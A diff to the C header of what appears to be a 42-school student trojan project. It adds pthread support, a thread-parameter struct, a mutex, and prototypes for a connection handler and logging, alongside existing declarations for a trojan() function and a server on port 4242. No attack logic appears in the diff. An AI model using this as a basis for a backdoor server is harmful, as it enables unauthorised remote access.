@@ -6,7 +6,7 @@
 /*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2017/06/01 14:25:26 by hivian            #+#    #+#             */
-/*   Updated: 2017/06/02 14:45:44 by hivian           ###   ########.fr       */
+/*   Updated: 2017/06/05 12:27:39 by hivian           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -20,7 +20,6 @@
 # define MAX_CLIENTS 3
 # define PORT 4242
 
-
 #include <stdio.h>
 #include <unistd.h>
 #include <stdlib.h>
@@ -33,6 +32,7 @@
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <pthread.h>
 
 typedef struct sockaddr_in	t_sock_in;
 
@@ -47,11 +47,22 @@ typedef struct				s_env
 	int						client_port;
 }							t_env;
 
+typedef struct				thread_params
+{
+	FILE					*logs;
+	int						sock;
+	int						total_connection;
+}							t_thread_params;
+
+extern int					g_total;
+pthread_mutex_t				lock;
 void						trojan(t_env *e);
 void						create_server(t_env *e);
 void						get_client_ip(t_env *e);
+void						*connection_handler(void *context);
 
 void						signal_handler();
+void						print_logs(FILE *file, char *str);
 int							x_int(int err, int res, char *str, char *file, int line);
 void						*x_void(void *err, void *res, char *str, char *file, int line);
 
